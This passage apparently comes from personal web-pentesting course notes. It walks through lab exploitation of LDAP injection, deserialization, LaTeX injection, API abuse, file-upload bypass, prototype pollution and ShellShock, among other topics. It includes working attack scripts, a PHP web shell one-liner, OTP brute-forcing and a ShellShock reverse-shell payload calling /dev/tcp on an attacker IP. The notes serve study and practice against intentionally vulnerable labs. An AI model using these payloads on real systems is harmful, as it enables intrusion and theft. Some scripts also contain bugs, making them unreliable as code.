    `wfuzz -c --hh=439 -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt -d ’user_id=admin)(FUZZ=*))%00&password=*&login=1&submit=Submit’ http://localhost:8888`
    
    ![[Untitled 208.png]]
    
    Lets make a script to enumarate users
    
    ```Python
    #!/usr/bin/python3
    
    import requests
    import time,sys,signal
    import string
    import pdb
    
    from pwn import *
    
    def def_handler(sig, frame):
    	print(\n\n[!]Saliendo..\n)
    	sys.exit(1)
    
    signal.signal(signal.SIG_INT, def_handler)
    
    \#variables globales
    main_url = "http://localhost:8888/"
    burp = {'http', 'http://127.0.0.1:8080'}
    
    def getInitialUsers():
    
    	characters = string.ascii_lowecase
    
    	initial_users = []
    
    	headers = {'Content-Type':'application/x-www-form-urlencoded'}
    
    	for character in characters:
    		
    		post_data = "user_id={}*&password=*&login=1&submit=Submit".format(character)
    
    		r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False, proxies=burp)
    
    		if r.status_code == 301:
    				initial_users.append(character)
    	return initial_users
    
    def getUsers(initial_users):
    	
    	characters = string.ascii_lowercase
    	headers = {'Content-Type':'application/x-www-form-urlencoded'}
    	
    	valid_users = []
    	for first_character in initial_users:
    		
    		user = ""
    		for position in range(0, 15):
    
    			for character in characters:
    			
    				post_data = "user_id={}{}{}*&password=*&login=1&submit=Submit".format(first_character, user, character)
    
    			r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False, proxies=burp)
    
    			if r.status_code == 301:
    				
    				user += character
    				break
    		valid_users.append(first_character +  user)
    
    	return valid_users
    
    if __name__ == '__main__':
    
    initial_users = getInitialUsers()
    getUsers(initial_users)
    ```
    

## Deserealization Attack

The deserealizaiton attacks are a type of vulnerability in the processes of **seralization and deserealization** of objects in the application that uses Object Oriented Programming (OOP).

  

Serialization is the proccess of converting an object in to a byte sequence that can be stored or trasmited through the network. Deserealization in the other hand is the inverse proccess of this, in which the byte secuence is converted back to an object.

The deserealization attacks occurs when an attacker can manipulate the data that is being deserealizated and lead to, for example, RCE in the server.

  

This attacks can occur in many type of applications, including web applications, mobile applications and desk applications. This attacks can be exploited in ways such as:

- Modifying the serialized object before is sent to the application, which can cause errors while desearializing.
- Sending an malicious serialized object that exploits a certain vulnerability of the application.
- Conducting a MiTM attack to intercept and modify the serialized object before it arrives at the application.

---

Machine used during lesson

• **Máquina Cereal 1**: [https://www.vulnhub.com/entry/cereal-1,703/](https://www.vulnhub.com/entry/cereal-1,703/)

---

- PoC Lab PHP
    
    Lets start with a recon
    
    ![[Untitled 209.png]]
    
    `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG <IP>`
    
    ![[Untitled 210.png]]
    
    ![[Untitled 211.png]]
    
    As seen the page is utilizing virtual hopsting, because it tries to load the content from an unknown unresolvable url
    
    ![[Untitled 212.png]]
    
    So, we add the host and the IP to the /etc/hosts
    
    ![[Untitled 213.png]]
    
    ![[Untitled 214.png]]
    
    Sometimes, when a hosts has various services deployed (with different ports) it is worth to scan for subdomain in each one of the services, this is because some service could have some subdomain or directory that another does not, ( in this case there is an HTTP port 80 and an HTTP port 44441)
    
    ![[Untitled 215.png]]
    
    So, using gobuster
    
    `gobuster -u http://cereal.ctf:44441/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20`
    
      
    
    ![[Untitled 216.png]]
    
    This is the webpage we found
    
    ![[Untitled 217.png]]
    
    Good, so after trying some things, this input is sanitized, it recieves an IP Address and then it shows us the response
    
    Lets use burpsuite to see the request and response
    
    ![[Untitled 218.png]]
    
    As seen, there is an URL encoded Object
    
    ![[Untitled 219.png]]
    
      
    
    Using gobuster again I found this resource
    
    ![[Untitled 220.png]]
    
    We dont have permission to list
    
    ![[Untitled 221.png]]
    
    So we could use fuzz to bruteforce files in this directory (in this case .php.bak)
    
    ![[Untitled 222.png]]
    
    This is the content of the that file
    
    ![[Untitled 223.png]]
    
    And this is the source code
    
    ![[Untitled 224.png]]
    
    Analyzing the code, we cans ee that the input is indeed sanitized, but the class relies on that only filter, we could take advantage of the attributes like $isValid setting it to TRUE in the proxy
    
    In our machine we can serialize a new object
    
    ![[Untitled 225.png]]
    
    ![[Untitled 226.png]]
    
      
    
- PoC Lab NodeJS
    
    > [!info] Exploiting Node.js deserialization bug for Remote Code Execution  
    > tl;dr Untrusted data passed into unserialize() function  in node-serialize module can be exploited to achieve arbitrary code execution by passing a serialized JavaScript Object with an Immediately invoked function expression (IIFE).  
    > [https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)  
    
    ![[Untitled 227.png]]
    
    ![[Untitled 228.png]]
    
    ![[Untitled 229.png]]
    
    IIFE Inmediatly Invoked Function Expression
    
      
    

## LaTex Injection

LaTex Injections are type of attack that in which the attacker makes uses of the vulnerabilities from a web application that allows users to insert LaTex formated text. LaTex is a text composition system that is widely used in academic and cientific writting.

  

This attacks occurs when an attacker inserts LaTex malicious code in a input field of the application that then is processed. This malicious code could be designed to take advantages of vulnerabilities in a server and execute code in this one.

An example of an LaTex injection could be an attacker in which the include of graphics and files is taken as an advantage. The attacker may sent code in LaTex that includes a malicious file URL.

  

To avoid LaTeX injections, web applications must properly validate and clean up incoming data before processing it in LaTeX. This includes removing special characters and limiting the commands that can be executed in LaTeX.

It is also important that web applications are run with minimum privileges on the network and that application activities are regularly monitored for possible injections. In addition, education about security in the use of LaTeX and how to prevent the introduction of malicious code should be encouraged.

---

• **Laboratorio LaTeX Injection**: [https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)

---

![[Untitled 230.png]]

![[Untitled 231.png]]

![[Untitled 232.png]]

Convert PDF to TEXT python

  

![[Untitled 233.png]]

- PoC LAB
    
    - setting up
        
        ![[Untitled 234.png]]
        
        ![[Untitled 235.png]]
        
        `chown www-data:www-data -R *`
        
    
    The application converts the text in the input to a pdf
    
    ![[Untitled 236.png]]
    
    Then is available to download from the server.
    
    ![[Untitled 237.png]]
    
    As seen, this software converts text to a HQ PDF. At first sight there is no vulnerabilities, but we can try with some payloads
    
    [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection)
    
    Looking into the code I can see that there is using `--shell-escape`while excuting the comands
    
    ![[Untitled 238.png]]
    
    What we are going to do is, using the following payload
    
    ![[Untitled 239.png]]
    
    We will be making a bash script that loops in every line of a given file e.g. `/etc/passwd`
    
    ```Bash
    #!/bin/bash
    
    declare -r main_url="http://localhost/ajax.php"
    filename=$1
    
    if [ $1 ]; then
    		file_to_download=$(curl -s -X POST $main_url -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "content=\newread\file%0A\openin\file=$filename%0A\read\file%20to\line%0A\text{\line}%0A\closein\file&template=blank" | grep -i download | awk 'NF{print $NF}')
    		wget $file_to_download &>/dev/null
    		file_to_convert=$(echo $file_to_download | tr '/' ' ' | awk 'NF{print $NF}')
    		pdftotext $file_to_convert
    		file_to_read=$(echo $file_to_convert | sed 's/\.pdf/\.txt')
    		rm $file_to_convert
    		cat $file_to_read | head -n 1
    		rm $file_to_read
    else
    echo -e "\n[!] Uso incorrecto, uso: $0 /etc/passwd"
    fi
    ```
    
    To make it recursive
    
    ![[Untitled 240.png]]
    
    Perfect, this is all injections, lets begin with some RCE
    
    ![[Untitled 241.png]]
    
      
    

## Abusing APIs

- Lab Config Update
    
    **Actualización 24/05/2023**: Si a la hora de desplegar el laboratorio con Docker, os encontráis con problemas y alguno de los contenedores que se despliegan véis que causan error, probad a desplegar como alternativa el laboratorio de desarrollo.
    
    Primeramente instalad la última versión de ‘**docker-compose**‘ y una vez hecho, ejecutad los siguientes comandos:
    
    - **curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/develop/deploy/docker/docker-compose.yml**
    - **VERSION=develop docker-compose pull**
    - **VERSION=develop docker-compose -f docker-compose.yml –compatibility up -d**
    
    En caso de que veáis que tras desplegar el laboratorio, siguen habiendo errores en el despliegue de ciertos contenedores, probad a hacer un ‘**docker rm $(docker ps -a -q) –force**‘ y aplicad el último comando de los 3 mencionados anteriormente para volver a desplegar los contenedores. Llegará un momento en el que todos serán desplegados sin ningún problema.
    
    Por otro lado, si de pronto véis que el comando ‘**docker rm $(docker ps -a -q) –force**‘ os da algún problema, esperad unos segundos y volved a probar el comando hasta que veáis que todos los contenedores han sido eliminados.
    

When we talk about API abusing, we refer to exploiting vulnerabilities in the APIs. These allows the communication and interchange of data between diferent aplications and services of a network.

An easy example of an API could be the Google Maps integration in a transport app.

Instead of making a new map, the developers could use Google’s API to show it in th app.

In this example, the API provides a series of functions and protocols that allows the Transport App to comunicate back and forth with Google’s servers and access the needed data.

Aditionally, in this lesson we will be using Postman. Postman is a tool to test and depure APIs. With Postman, the developers can send requests to diferent endpoints and see their responses. This is also useful for attackers that are searching vulnerabilities.

Some APIs endopoints could accept different request methods, such as, GET, POST, PUT, DELETE, etc. These attackers could use fuzzing tools to send a large amount of requests to and endpoint looking for vulnerabilities.

Some of the common vulnerabilities that can be exploited are:

- SQL Injection: The attackers could send malicious data in the requests to try and inject SQL code.
- CSRF: The attackers could send malicious request to the API in behalf of an authenticated user to make un-authorized actions.
- Information Exposure: The attackers could explore the endpoints to obtain confidential information, like API keys, passwords and usernames.

---

Lab used for this lesson:  
•  
**crAPI**: [https://github.com/OWASP/crAPI](https://github.com/OWASP/crAPI)

---

- PoC LAB
    
    Install Postman for this lesson
    
    Using the browser network tools, we can see some API that are being used
    
    ![[Untitled 242.png]]
    
    We can test these endpoints with postman
    
    It is recommended to use Variables in Postman, so we can set the token dinamically
    
      
    
    In this case, after enumerating all the endpoints of the APIs (ENUMERATE), we found that theres is a fortgot password endoint that uses a weak OTP (4 digit PIN) to change the password, so we can try and fuzz with SecLists’s PIN dictionary.
    
    `ffuz -u http://localhost:8888/identity/api/auth/v3/check-otp -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -X POST -d {"email":"s4vitar@hack4u.io", "otp":"FUZZ","password":"NewPass123!$"}`
    
    After sometime, the API blocks us because we use bruteforce.
    
    We saw that the API uses v2 and v3 for different endpoints, so when we check the OTP in the URL above, is using the v3, but if we try with the v2 we are no longer blocked, interesting….
    
    ![[Untitled 243.png]]
    
    As we see, using v2 of the API we found the OTP and changed the user’s password.
    
    This is the first vector of the crAPI project.
    
    ---
    
    SecLists has a HTTP methods dictionary.
    
    So, with this vector, we fuzz the different methods allowed by the API endpoints, and discovered that in the /workshop/api/shop/products it accepts POST in top the GET method. The GET method gives us the available products in the markket, but with the POST method seems like we can create a new product…
    
    ![[Untitled 244.png]]
    
    And yes, we can, we created a new product with this endpoint.
    
    Let’s see how it behaves with the `-10000` price we created.
    
    ![[Untitled 245.png]]
    
    We rich baby, we created the product and broke the logic of the app
    
    ---
    
    For the third vector, we saw a coupon input, and it travel to the API via POST, let’s see what we can do.
    
    ![[Untitled 246.png]]
    
    Testing for NoSQL injection, we found a valid coupon
    
    ![[Untitled 247.png]]
    
    As seen, we used {“$ne”: “1”}
    
    ---
    
    LEER SOBRE BOLA BROKEN OBJECT LEVEL AUTHZ
    
    When we go to the /community tab, we see in the communication with the API that information of the user who posted is leaked.
    
    Using its ID of the vehicle we can see its geolocation.
    

## File Upload Abuse

File upload abuse is a type of attack that is produced when an attacker takes advantage of vulnerabilities in the web aplications that allows users to upload files.

In this attack, a malicious file is uploaded and stored in the server. If, for example, the attacker uploads a PHP file and the server stores it, it could achieve a RCE and take control of the server.

Theres also a technique called “file extension falsification” to trick a web app to accept a malicious file as it was a legitimate file.

In this lesson we will be looking through the different techniques.

---

Lab used during lesson.

  
•  
**File Upload Laboratory**: 

[https://github.com/moeinfatehi/file_upload_vulnerability_scenarios](https://github.com/moeinfatehi/file_upload_vulnerability_scenarios)

---

- PoC Lab
    
    - Lab 1 - No sanitization
        
        For the first lab, there is this file upload input
        
        ![[Untitled 248.png]]
        
        As seen, we can supposedly only be able to upload jpeg and gif files.
        
        Testing we can see that there is no sanitization, since we uploaded a .php file
        
        ![[Untitled 249.png]]
        
          
        
    - Lab 2 - Client-side Sanitization
        
        Now the second lab does not allows to upload this .php file.
        
        ![[Untitled 250.png]]
        
        So, now, as an attacker we need to make sure where these validations are taking place, in the server or in the client side.
        
        If we see the source code of this page, we can see that there is a validate.js script being uploaded.
        
        ![[Untitled 251.png]]
        
        We can see also that this script is invoked when we submit the form (in this case the uploaded file).
        
        This is the content of the validate.js code
        
        ![[Untitled 252.png]]
        
        Now, since this validation is on the client side, we can remove this **onsubmit** parameter of the form.
        
        ![[Untitled 253.png]]
        
        And voila, we have the file uploaded.
        
        ![[Untitled 254.png]]
        
    - Lab 3 - Different Extensions php, php3, php4
        
        In this case, we cannot upload php files as told in the page.
        
        ![[Untitled 255.png]]
        
        Also, it looks like the validation is taking place in the server, since I saw a response before the error was shown.
        
        In this case, since the validation is on the server side, we could try different extensions, since a developer could have sanitize the most known extension like .php.
        
        If we look for more extensions, we can see in Hacktricks that we have a lot more:
        
        ![[Untitled 256.png]]
        
        If we, for example, try with .php3.
        
        ![[Untitled 257.png]]
        
        We can upload this file and be executed.
        
        Be aware that if the script is not being executed, we should try with the other extensions listed in Hacktricks.
        
        ![[Untitled 258.png]]
        
    - Lab 4 - Different Extensions php, pht, phtml
        
        Again, we cannot upload .php files, and looks like the validation takes place in the server side.
        
        ![[Untitled 259.png]]
        
        If we try .pht
        
        ![[Untitled 260.png]]
        
        ![[Untitled 261.png]]
        
    - Lab 5 - .htaccess file
        
        In this case there is also a validations of the extensions
        
        If we try all of these extensions neither would work.
        
        So, we need to use .htaccess, and what is this?
        
        The **.htaccess** is a config file that lets us define policies without touching the main config apache file.
        
        ![[Untitled 262.png]]
        
        So in this case, we are going to say that all the .php16 files have to be interpreted as PHP.
        
        ![[Untitled 263.png]]
        
        In this case, the extension will be .test
        
        As seen, we uploadded it
        
        ![[Untitled 264.png]]
        
        And boom, is executing code
        
        ![[Untitled 265.png]]
        
    - Lab 6 - File Size
        
        If we upload our cmd.php
        
        ![[Untitled 266.png]]
        
        If we control the MAX_FILE_SIZE
        
        ![[Untitled 267.png]]
        
        We could also play with the length of the payload.
        
        The parameter now will be 0, this saves space since the number do not need to be between colons.
        
        ![[Untitled 268.png]]
        
        ![[Untitled 269.png]]
        
    - Lab 7 - File Size Extra-Security
        
        ![[Untitled 270.png]]
        
        In this case we compressed even more the payload
        
        ![[Untitled 271.png]]
        
        ``<?=`$_GET[0]`?>``
        
    - Lab 8 - FIle Type
        
        ![[Untitled 272.png]]
        
        If we upload this
        
        ![[Untitled 273.png]]
        
        Now, we could change the content type
        
        ![[Untitled 274.png]]
        
        Another way of doing this is to play with the magic numbers, which are the first bytes of file
        
        ![[Untitled 275.png]]
        
        ![[Untitled 276.png]]
        
        As seen, this is a .php file, but it appears to be a .gif picture.
        
          
        
    - Lab 9 - File type client and server side
        
        In this case, the application only allows .gif images, but this time we have an extension validation on client side, and a content type validation on server side
        
        ![[Untitled 277.png]]
        
        To bypass this client side we could remove the validation from the upload button.
        
        ![[Untitled 278.png]]
        
        Now we sent this to the server and see that is validating the type of file.
        
        ![[Untitled 279.png]]
        
        Now, is it validating the content type?
        
        ![[Untitled 280.png]]
        
        NO, apparently no, there is another validation that detects that this is a .php file.
        
        Now, lets try with the firsts bytes
        
        ![[Untitled 281.png]]
        
        And, yes, we uploaded it
        
          
        
    - Lab 10 - Name hashing
        
        In this case apparently we can only upload .jpeg files
        
        ![[Untitled 282.png]]
        
        As we try, we uploaded succesfully the file.
        
        ![[Untitled 283.png]]
        
        This is weird, since it appears that there is no validations.
        
        There is a peculiar gif in the page, this gif is uploaded to.
        
        ![[Untitled 284.png]]
        
        This hash has a length of 32, so it appears to be as a md5 hash.
        
        So we can try to search our cmd.php as `echo -n "cmd" | md5sum`
        
        ![[Untitled 285.png]]
        
        ![[Untitled 286.png]]
        
        And once more, there is no sanitization, but we can see that there is a measure that sometimes is taken by devs.
        
    - Lab 11 -
        
        ![[Untitled 287.png]]
        
        We uploaded again a file, and we have the same gif with the same length so, another md5 hash.
        
        But in this case all the name is hashed
        
    
    It is worth to mention, that shall try and reason what is being used, if is not md5 could be sha1 or another encoding.  
    As a safety feature, the application could not tell where the file was uploaded, so we could use gobuster to fuzz for directories in the server and then found our .php payload.  
    
    - Lab 12 - Double extension
        
        In this case we try different .php extension, changing the content type, magic numbers, etc. but nothing seems to works.
        
        ![[Untitled 288.png]]
        
        Sometimes the devs use regex to search for the .jpg in the file, so this allows a double extension attack.
        
        ![[Untitled 289.png]]
        
        ![[Untitled 290.png]]
        
    - Lab 13 - Downable file
        
        In this case if a file is not “readable” and the server lets you download it we can use curl to pass the parameter
        
        ![[Untitled 291.png]]
        
        ![[Untitled 292.png]]
        
    - Lab final - mix
        
        In this lab we had to upload a .htaccess policy to enable the .pwned extension as .php and then upload the cmd.php file changing the content type to image/gif and the magic numbers to GIF8;
        

## Prototype Pollution

This attack takes advantages of the vulnerabilities of objects implemented in JavaScript. This technique is used to modify the properties of a “Prototype” of an object used in a web application, this could allow the attacker to execute malicious code or manipulate data.

In JS the property of a “Prototype” is used to define the properties and methods of an object. The attackers may explode these characteristics to modify the properties and methods of an object.

The “Prototype Pollution” attack is produced when a an attacker modifies the property of “prototype” of an object in a web app. This could be done by manipulating the data that is sent via forms or AJAX requests, or via insertion of malicious code into the JS app.

Once the object is manipulated, the attacker may execute code in the application, manipulate data or take control of the session. For example, the attacker could modify the “prototype” property of an authentication object to allow the access to an account without a password.

The impact of this attack is very significative since the attackers could take control of the application or compromise user data. In addition, since this vulnerability relays in the implementation of objects in JS, it could be difficult to detect and patch.

---

Lab used in this lesson:  
•  
**SKF-LABS**: [https://github.com/blabla1337/skf-labs](https://github.com/blabla1337/skf-labs)

---

- PoC Lab
    
    Once the repo is cloned and the nodejs>PrototypePollution lab is installed then we can use the web app.
    
    The web app lets you create an user with no privileges and send messaged to an admin user.
    
    ![[Untitled 293.png]]
    
    If we take a look of the code (to understand this) then we can see what the /message function is doing, and we add a console.log() so we can see with more detail.
    
    ![[Untitled 294.png]]
    
    If we send via the app the message
    
    ![[Untitled 295.png]]
    
    We can see that they are merging two objects
    
    ![[Untitled 296.png]]
    
    To show this we can use a JS console
    
    ![[Untitled 297.png]]
    
    What we can do here is to showcase how we can polute the prototype of this object, in this case we can merge in the body object (this is the one that we can control in the vulnerable app) another object with the admin key:value.
    
    ![[Untitled 298.png]]
    
    IN this case the data is being sent as form data, but we can try sending it as JSON data
    
    ![[Untitled 299.png]]
    
    If we change the content type and parse the data
    
    ![[Untitled 300.png]]
    
    Now if we polute the __proto__ lets see if we can elevate our privileges
    
    ![[Untitled 301.png]]
    
    And yes, we can
    
    ![[Untitled 302.png]]
    
    So basically, prototype pollution is exploited because when a value is nonexistent for a user, this is heredited from the prototype, that in our case, we are polluting by adding to the prototype the admin value in true.
    

## Zone Transfer Attack (AXFR - Full Zone Transfer)

This attacks are directed to DNS servers and allows the attackers to gather sensible information about an organization domains.

In simple terms, the DNS servers takes cares of translating domain names to IP addresses. The AXFR attacks allows the attackers to obtain information about the DNS registers.

The AXFR attack is carried out by sending a request of zone transfer from a fake DNS server to a legitimate DNS server. This request is made using the DNS zone transfer protocol, which is used by the DNS servers to transfer the registers from a server to another.

If the legitimate server is not properly configurated, it could response to the zone transfer request providing the attacker with the information. This includes the domain names information, IP Addresses, mail servers and other type of sensitive information that may be used in other attacks.

One of the tools that we use in this lesson is **dig**. This command is a tool to make DNS requests and obtain information of the DNS registers.

The sintax is:

➜ `dig @<DNS-server> <domain-name> AXFR`

To prevent AXFR attacks, it is important for network administrators to properly configure DNS servers and limit zone transfer access to authorized servers only. It is also important to keep DNS server software up to date and use strong encryption and authentication techniques to protect data being transmitted over the network. Administrators can also use DNS monitoring tools to detect and prevent potential zone transfer attacks.

---

This is the lab used for this lesson.  
•  
**DNS-Zone-Transfer**: [https://github.com/vulhub/vulhub/tree/master/dns/dns-zone-transfer](https://github.com/vulhub/vulhub/tree/master/dns/dns-zone-transfer)

---

- PoC Lab
    
    Once we download the vulnhub resource
    
    `svn checkout` `[https://github.com/vulhub/vulhub/trunk/dns/dns-zone-transfer](https://github.com/vulhub/vulhub/tree/master/dns/dns-zone-transfer)`
    
    ![[Untitled 303.png]]
    
    If we as an attacker we can see this .db file, we will be saving time of bruteforcing.
    
    ![[Untitled 304.png]]
    

## Mass Assignment Attack / Parameter Binding

This attack is based in the manipulation of the input parameters of a HTTP request to create or modify an object field. Instead of creating new objects the attackers take advantage of the functionality of the existing ones to modify fields that should not be modified.

For example, in a user management web application, a form could have username, email and password fields. However, if the application makes use of a library or a framework that allows massive assignment of parameters, the attacker could modify the HTTP request to add an additional parameter like the user privileges. In this way, the attacker could elevate the permissions of a non-privileged user.

---

Lab used in this lesson:  
•  
**Juice Shop**: [https://hub.docker.com/r/bkimminich/juice-shop](https://hub.docker.com/r/bkimminich/juice-shop)

---

- PoC Lab
    
    If we register in the app
    
    ![[Untitled 305.png]]
    
    We can see that the data is being transmitted in JSON format.
    
    ![[Untitled 306.png]]
    
    So, the basis of an Mass Assignment is that we can send more parameters than the expected
    
    So if we send the role:admin key value
    
    ![[Untitled 307.png]]
    
    We created an user with admin role
    
      
    

## Open Redirect

This vulnerability is common in web applications and can be exploited by attackers to redirect users to malicious web sites. It is produced when the application allows the users to manipulate the redirection page URL.

For example, let’s asume that an application uses a parameter to redirect a user to an external page after the user has authenticated. If this URL does not properly validate the redirection parameter, an attacker could modify this parameter to redirect the users to a malicious application instead of the legitimate web site.

An example of how an attacker could exploit this vulnerability is by sending phishing, and attach the modified URL in the email.

To prevent the open redirect vulnerability, it is important for developers to implement appropriate security measures in their code, such as validating redirect URLs and limiting redirect options to legitimate websites. Developers can also use secure encoding techniques to prevent URL manipulation, such as encoding special characters and removing invalid characters.

---

Labs used in this lesson:

- **Open Redirect 1**: [https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Url-redirection](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Url-redirection)
- **Open Redirect 2**: [https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Url-redirection-harder](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Url-redirection-harder)
- **Open Redirect 3**: [https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Url-redirection-harder2](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Url-redirection-harder2)

---

- PoC Lab
    
    So in this lab we have a “old website” and a button that takes us to the new one
    
    ![[Untitled 308.png]]
    
    READ UFONET
    
    ---
    
    Another way to bypass is using URL encoding
    
    ![[Untitled 309.png]]
    
    ---
    
    HTTPS allows you to not use :// the double slash
    
      
    

## WebDAV Enumeration & Exploitation

WebDAV is an extension to HTTP protocol that allows users to access and manipulate files in a web server through a secure connection.

When we talk about enumerating a WebDAV server, we are referring to the process of compiling information about the available resources. The attackers may use tools to enumerate WebDAV to search for protected resources in the server like, configuration files, passwords and other type of confidential data. The attackers could use this information collected to prepare a more refined attack.

At the same time, this enumeration tries to discover the file extension that are allowed by the server. Once detected, could use this advantage to upload and execute malicious code that gives the attackers access to the server and compromise the system.

One of the tools we will be looking is called “**davtest”**. This tool is used to make pentestings to a WebDAV server and is capable of enumerate protected resources aswell as testing the configuration of the server. It can also test the authentication and authorization of the server to detect known vulnerabilities.

Another tool is “**cadaver**”. This is another tool to interact with WebDAV servers and allows us to browse through the server’s resources, upload and download files, and even, execute commands on the server.

---

Lab used during lesson:  
•  
**WebDav**: [https://hub.docker.com/r/bytemark/webdav](https://hub.docker.com/r/bytemark/webdav)

---

- PoC Lab
    
      
    

## SQUID Proxies Enumeration & Exploitation

SQUID Proxy is a cache-proxy server with GPL license which it objective is to work as a network proxy and also as a cache zone to store web pages. It is a server between an user machine and another network (internet most of the times) that acts as a layer of protection separating the two networks and as a cache to speed up the access to the pages as well as forbid resources.

![[Untitled 310.png]]

So in the case that a SQUID proxy is badly configured, it could allow the attackers to gather information about the devices that connect.

For example, an attacker could make requests to internal IPs to scan ports of other servers in the internal network.

➜  `curl --proxy http://10.10.11.131:3128 http://<ip>:<port>`

This is posible because the proxy server acts as middleman between the internal network and the external network. This allows the access to certain resources that normally would not be available.

However, some resources could be restricted by security policies, authentication or other access control mechanisms.

One of the tools use for scanning this proxy is “**spose**”.

---

Spose tool:  
•  
**Herramienta Spose**: [https://github.com/aancw/spose](https://github.com/aancw/spose)

Lab used during the lesson:  
•  
**Máquina SickOs 1.1**: [https://www.vulnhub.com/entry/sickos-11,132/](https://www.vulnhub.com/entry/sickos-11,132/)

  

---

- PoC Lab
    
    ![[Untitled 311.png]]
    
    If we use this proxy as proxy for the tools
    
    ![[Untitled 312.png]]
    
    We can see that we have a port 80 after the proxy.
    
    Now we make a script for scanning the ports after the proxy (internal network).
    
    ```Python
    #!/usr/bin/python3
    
    import sys, signal, requests
    
    def def_handler(sig, frame):
    	print("\n\n[!] Saliendo...\n")
    	sys.exit(1)
    	
    # Ctrl+C
    signal.signal(signal.SIGINT, def_handler)
    
    
    main_url = "http://127.0.0.1" \#this is the localhost after the proxy
    squid_proxy = {'http': 'http://<proxy_IP>:<proxy_port>'}
    
    def portDiscovery():
    	
    	common_tcp_ports = {}
    	
    	for tcp_ports in common_tcp_ports:
    		r = requests.get(main_url + ':' + str(tcp_ports), proxies=squid_proxy)
    		
    		if r.status_code != 503:
    			print("\n [+]PORT" + str(tcp_port) + " - OPEN")
    	
    if __name__ == '__main__':
    	portDiscovery()
    ```
    
    And we discover this ports.
    
    ![[Untitled 313.png]]
    

## ShellShock Attack

This attack takes advantage of a vulnerabilty in BASH command line for Linux and Unix OS. This vulnerability was discovered in 2014 and is considered one of the larger attacks in the history.

This bash vulnerabilty allows the attackers to execute commands in the affected system, which let them take control over the system and access to confidential information, modify files , install malware, etc.

This vulnerability is introduced when the command interpreter bash is used by many Unix and Linux systems to execute scripts. The problem is how bash handles enviroment variables. The attackers could inject code in this variables and bash will execute them without looking its origin.

The attackers could exploit this using different attack vectors. One of them is via User-Agent header, which is the information that the browser sends to the server to identify the browser and system is being used. The attacker may manipulate this headers to include commands and the web server will execute this commands when recieves this request.

---

Lab used in this lesson:  
•  
**SickOs 1.1**: [https://www.vulnhub.com/entry/sickos-11,132/](https://www.vulnhub.com/entry/sickos-11,132/)

---

- PoC Lab
    
    while enumerating the server we saw a /cgi-bin/
    
    ![[Untitled 314.png]]
    
    it is important to know that whenever we found a /cgi-bin/ its important to test for shellshock.
    
    If we redo a scan
    
    ![[Untitled 315.png]]
    
    And we can see that this is being executed
    
    ![[Untitled 316.png]]
    
    Using this article of how to exploit Shellshock
    
    > [!info] Inside Shellshock: How hackers are using it to exploit systems  
    > On Wednesday of last week, details of the Shellshock bash bug emerged.  
    > [https://blog.cloudflare.com/inside-shellshock](https://blog.cloudflare.com/inside-shellshock)  
    
    We can try to execute commands, remember that sometimes we have to add en `echo;` before the command if this does not works.
    
    ![[Untitled 317.png]]
    
    Now lets automate this
    
    ```Python
    #!/usr/bin/python3
    
    import sys, signal, requests, threading
    from pwn import *
    
    def def_handler(sig, frame):
    	print("\n\n[!]Saliendo...\n")
    	sys.exit(1)
    	
    \#CTRL+C
    signal.signal(signal.SIGINT, def_handler)
    
    \#Variables globales
    main_url = "http://127.0.0.1/cgi-bin/status"
    squid_proxy = {'http': 'http://<PROXY_IP>:<PROXY_PORT>'}
    listen_port = 443
    attackers_ip = 192.168.111.39
    
    
    def shellshock_attack():
    
    	headers = {'User-Agent': "() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/"+ str(attackers_ip) + "/" + str(listen_port) + " 0>&1'"}
    
    	
    	r = requests.get(main_url, headers=headers, proxies=squid_proxy)
    	
    	
    if __name__ == '__main__':
    	try:
    		threading.Thread(target=shellshock_attack, args=().start)
    	else:
    		log.error(str(e))
    		
    	shell = listen(lport, timeout=20).wait_for_connection()
    	
    	if shell.sock is None:
    		log.failure("\n\n[!]No se pudo establecer la conexion\n")
    		sys.exit(1)
    	else:
    		shell.interactive()
    ```
    
      
    

## XPath Injections

XPath is an query language used in XML that allows to search and retrieve specific information from XML Documents. However, same as others query languages, XPath has vulnerabilities too.

This XPath vulnerabilities are those that takes advantages of the implementation of XPath in a web app. Here are some common vulnerabilities:

- XPath Injection: Injection of malicious code into the XPath querys to alter the behaviour of the application. For example, they may append a malicious query that leaks user information.
- XPath Bruteforce Attack: Bruteforce techniques may be used to guess the paths in XPath and retrieve confidential information. This techniques realys in trying every path until one gives information.
- Server Information Retrieve: Querys could be used to retrieve server’s information, like, database type, application version, etc. This information helps the attackers to craft a more sophisticated attacks.
- XPath response manipulation: By manipultaing the XPath responses of the web application it can be obtained aditional information or alter the behaviour of the application. For example, a response can be modified to create an user without permission.

To protect against this attacks is important to validate every user input and avoid dynamic construction of XPath querys.

---

Lab used during lesson:  
•  
**XVWA 1**: [https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/](https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/)

---

- PoC Lab
    
    This is the lab
    
    ![[Untitled 318.png]]
    
    Now go tab XPATH injection
    
    ![[Untitled 319.png]]
    
    To add some difficulty do this configuration
    
    ![[Untitled 320.png]]
    
    ![[Untitled 321.png]]
    
    the basis of this app is that there is a list of coffees to search
    
    ![[Untitled 322.png]]
    
    For example this is the number one and its tags <Coffees><Coffee>
    
    The query is being made as /Coffees/Coffee[@ID=’1’]
    
    ![[Untitled 323.png]]
    
    Giving as a result
